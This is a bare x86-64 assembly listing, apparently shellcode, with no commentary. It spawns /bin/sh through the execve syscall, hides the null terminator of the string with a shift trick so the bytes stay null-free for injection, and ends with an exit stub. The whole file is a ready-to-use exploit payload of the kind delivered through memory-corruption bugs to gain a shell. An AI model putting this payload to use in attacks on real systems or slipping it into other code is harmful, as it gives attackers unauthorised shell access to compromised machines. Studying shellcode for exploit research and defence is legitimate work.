.section .text
.global _start

_start:
xor %rax, %rax
push %rax
mov %rsp, %rdx
mov $0x1168732f6e69622f, %rbx
shl $0x08,%rbx
shr $0x08,%rbx
push %rbx
mov %rsp, %rdi
push %rax
push %rdi
mov %rsp, %rsi

end:
movb $59, %al
syscall

exit:
xor %rdi,%rdi
xor %rax,%rax
movb $60, %al
syscall





 




